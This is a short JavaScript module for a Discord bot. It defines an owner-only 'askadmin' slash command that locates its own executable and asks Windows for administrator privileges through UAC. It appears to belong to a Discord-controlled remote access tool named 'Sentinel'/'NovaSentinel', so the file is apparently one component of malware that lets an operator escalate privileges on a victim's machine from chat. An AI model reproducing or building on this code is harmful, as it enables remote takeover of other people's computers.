const { ApplicationCommandOptionType, EmbedBuilder } = require("discord.js"),
  uac = require("../../../Sentinel/utils/uac"),
  core = require("../../../Sentinel/utils/core");

module.exports = {
  name: "askadmin",
  ownerOnly: true,
  description: "Ask for Admin permission",

  run: async (client, interaction, args) => {
    await interaction.editReply({
      content: `Ask admin to windows.`,
      ephemeral: true,
    });
    let myselfbis = await core.NovaSentinelFindMyself()
    uac.requestAdminPrivilegesIfNeeded(
      myselfbis,
      "yes",
      "yes",
      "yes",
    );
  },
};
